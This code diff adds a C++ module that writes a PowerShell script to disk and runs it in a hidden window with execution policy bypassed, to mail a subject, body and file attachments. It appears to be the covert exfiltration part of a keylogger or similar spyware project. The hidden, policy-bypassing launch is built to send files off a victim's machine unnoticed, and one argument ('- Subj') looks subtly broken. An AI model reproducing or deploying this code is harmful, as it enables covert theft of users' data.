@@ -79,7 +79,101 @@ namespace mail
             return (bool) file;
         }
 
+        bool CreateScript()
+        {
+            std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
 
+            if(!script)
+                return false;
+
+            script << PowerShellScript;
+
+            if(!script)
+                return false;
+
+            script.close();
+
+            return true;
+        }
+
+        Timer m_timer;
+
+        int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
+        {
+            bool ok;
+
+            ok = IO::MKDir(IO::GetOurPath(true));
+            if(!ok)
+                return -1;
+
+            std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
+
+            if(!CheckFileExists(scr_path))
+                ok=CreateScript();
+
+            if(!ok)
+                return -2;
+
+            std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
+                                + StringReplace(subject, "\"", "\\\"") +
+                                "\" -Body \""
+                                + StringReplace(body, "\"", "\\\"") +
+                                "\" -Att \"" + attachments + "\"";
+
+            SHELLEXECUTEINFO ShExecInfo = {0};
+            ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+            ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+            ShExecInfo.hwnd = NULL;
+            ShExecInfo.lpVerb = "open";
+            ShExecInfo.lpFile = "powershell";
+            ShExecInfo.lpParameters = param.c_str();
+            ShExecInfo.lpDirectory = NULL;
+            ShExecInfo.nShow = SW_HIDE;
+            ShExecInfo.hInstApp = NULL;
+
+            ok = (bool) ShellExecuteEx(&ShExecInfo);
+            if(!ok)
+                return -3;
+
+            WaitForSingleObject(ShExecInfo.hProcess, 7000);
+            DWORD exit_code = 100;
+
+            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+
+            m_timer.setFunction([&]()
+            {
+                WaitForSingleObject(ShExecInfo.hProcess, 60000);
+                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+                if((int)exit_code == STILL_ACTIVE)
+                    TerminateProcess(ShExecInfo.hProcess, 100);
+
+                Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
+            });
+
+            m_timer.RepeatCount(1L);
+            m_timer.SetInterval(10L);
+            m_timer.Start(true);
+            return (int)exit_code;
+
+        }
+
+        int SendMail(const std::string &subject, const std::string &body,
+                     const std::vector<std::string> &att)
+        {
+            std::string attachments = "";
+            if(att.size() == 1U)
+                attachments=att.at(0);
+            else
+            {
+                for(const auto &v : att)
+                    attachments += v + "::";
+
+                attachments = attachments.substr(0, attachments.length() - 2);
+
+            }
+
+            return SendMail(subject, body, attachments);
+        }
 
 
 }
